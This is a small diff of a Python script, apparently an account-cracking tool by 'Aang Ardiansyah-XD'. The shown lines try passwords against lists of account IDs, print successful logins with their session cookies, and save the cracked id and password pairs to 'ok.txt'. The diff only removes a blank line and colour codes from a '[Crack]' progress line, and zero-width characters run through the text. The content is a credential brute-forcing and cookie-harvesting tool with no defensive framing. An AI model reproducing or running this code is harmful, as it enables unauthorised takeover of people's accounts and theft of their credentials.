@@ -1,5 +1,4 @@
- 
- ​#!/usr/bin/python3 
+ #!/usr/bin/python3 
  ​#-*-coding:utf-8-*- 
  ​# Made With ❤️ By Aang Ardiansyah-XD 
  ​import​ ​requests​,​bs4​,​sys​,​os​,​random​,​time​,​re​,​json​,​concurrent 
@@ -110,7 +109,7 @@
  ​                ​elif​ ​log​.​get​(​"status"​)​==​"success"​:​print​(​"​\r​[OK] %s • %s • %s              "​%​(​fl​.​get​(​"id"​),​i​,​koki​(​log​.​get​(​"cookies"​))));​self​.​ada​.​append​(​"%s•%s"​%​(​fl​.​get​(​"id"​),​i​));​open​(​"ok.txt"​,​"a+"​).​write​(​"%s•%s​\n​"​%​(​fl​.​get​(​"id"​),​i​));​break 
  ​                ​else​:​continue 
  ​            ​self​.​ko​+=​1 
- ​            ​print​(​"​\r​\x1b[0;95m[\x1b[0;97mCrack\x1b[0;95m][%s/%s\x1b[0;95m][\x1b[0;97mOK:%s\x1b[0;95m][\x1b[0;97mCP:%s\x1b[0;95m]"​%​(​self​.​ko​,​len​(​self​.​fl​),​len​(​self​.​ada​),​len​(​self​.​cp​)), ​end​=​' '​);​sys​.​stdout​.​flush​() 
+ ​            ​print​(​"​\r​[Crack][%s/%s][OK:%s][CP:%s]"​%​(​self​.​ko​,​len​(​self​.​fl​),​len​(​self​.​ada​),​len​(​self​.​cp​)), ​end​=​' '​);​sys​.​stdout​.​flush​() 
  ​        ​except​: 
  ​            ​self​.​mbasic​(​fl​) 
  ​def​ ​started​(): 
